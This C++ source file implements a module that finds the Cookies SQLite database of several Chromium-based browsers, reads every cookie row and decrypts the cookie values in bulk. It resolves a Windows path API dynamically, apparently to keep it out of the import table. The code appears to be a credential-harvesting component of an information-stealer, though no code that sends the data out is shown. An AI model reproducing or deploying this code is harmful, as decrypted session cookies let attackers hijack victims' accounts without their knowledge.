#include "ChromeCookiesParser.h"

#include <memory>
#include <sqlite3.h>
#include <Base64.h>
#include <json.hpp>

#include "ChromeDecryptor.h"


ChromeCookiesParser::~ChromeCookiesParser()
{
	if (m_pbOutput)
		delete[] m_pbOutput;
}

List<CookieData> ChromeCookiesParser::collect_data()
{
	for(const auto& browser : m_chromium_list)
	{
		try_collect(browser);	}

	return m_collected_data;
}

void ChromeCookiesParser::try_collect(const String& chromium_path)
{

	List<CookieData> out_data;
	if (!get_path_to_db(chromium_path)) return;

	sqlite3* db;

	if (sqlite3_open(m_chrome_sqlite_path.c_str(), &db) != SQLITE_OK)
		return;


	sqlite3_stmt* stmt;
	if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies", -1, &stmt, 0) != SQLITE_OK)
		return;

	int entries = 0;


	ChromeDecryptor decryptor;
	
	if (!decryptor.init(chromium_path)) return;


	if (!m_pbOutput)	
		m_pbOutput = new char[MAX_SIZE_PASS];
	

	while (sqlite3_step(stmt) == SQLITE_ROW)
	{
		CookieData user_data;

		char* host_key = (char*)sqlite3_column_text(stmt, 0);
		char* name = (char*)sqlite3_column_text(stmt, 1);
		char* path = (char*)sqlite3_column_text(stmt, 2);
		char* encrypted_value = (char*)sqlite3_column_text(stmt, 3);
		char* expires_utc = (char*)sqlite3_column_text(stmt, 4);
		

		if (host_key == nullptr && name == nullptr && encrypted_value == nullptr)
			break;
		if ((strlen(host_key) == 0) && (strlen(name) == 0) && (strlen(encrypted_value) == 0))
			continue;


		user_data.HostKey = host_key;
		user_data.Name = name;
		user_data.Path = path;
		user_data.ExpireUTC= expires_utc;
		
		
		decryptor.set_password_size(sqlite3_column_bytes(stmt, 3));

		String decrypted_cookie;
		
		if (decryptor.decrypt_data(encrypted_value, decrypted_cookie))
			user_data.Value = decrypted_cookie;

		out_data.emplace_back(user_data);
		entries++;
	}

	for(const auto& item:  out_data)
	{
		m_collected_data.emplace_back(item);
	}
}


bool ChromeCookiesParser::get_path_to_db(const String& chromium_path)
{
	const auto get_user_path = WinApiImport<f_SHGetFolderPathA>::get("SHGetFolderPathA", "shell32.dll");
	
	if (!get_user_path) return false;

	const int local_data_app = 0x001c;
	char _path[MAX_PATH];
	if(get_user_path(NULL, local_data_app, NULL, 0, _path) != S_OK) return false;
	m_chrome_sqlite_path = _path;
	m_chrome_sqlite_path += chromium_path +R"(\User Data\Default\Cookies)";
	return true;	
}


